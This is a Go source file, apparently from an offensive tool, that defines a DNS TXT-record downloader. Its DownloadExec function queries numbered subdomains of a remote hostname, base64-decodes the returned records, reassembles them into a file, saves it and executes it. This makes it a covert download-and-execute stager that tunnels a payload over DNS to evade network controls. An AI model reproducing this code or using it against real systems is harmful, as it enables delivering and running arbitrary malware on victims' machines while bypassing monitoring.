package downloader

import (
	"bytes"
	"encoding/base64"
	"net"
	"strconv"
)

// DnsTxtDownload is an empty struct used to satisfy the Downloader interface.
type DnsTxtDownload struct {
}

// DownloadExec makes repeated TXT lookups to i.hostname, where i is incremented
// from 0 until no record is returned. The TXT record is base64 decoded and
// added to the data to be saved.
//
// This excellent idea came from @breenmachine https://github.com/breenmachine/dnsftp
func (d *DnsTxtDownload) DownloadExec(hostname string) {
	var chunks [][]byte
	count := 0

	for {
		sub := strconv.Itoa(count)
		rec, err := net.LookupTXT(sub + "." + hostname)
		if err != nil {
			return
		}

		if rec[0] == "" {
			break
		}

		chunk, err := base64.StdEncoding.DecodeString(rec[0])
		if err != nil {
			return
		}

		chunks = append(chunks, chunk)
		count++
	}

	data := bytes.Join(chunks, []byte(""))
	filename := save(data)
	run(filename)
}
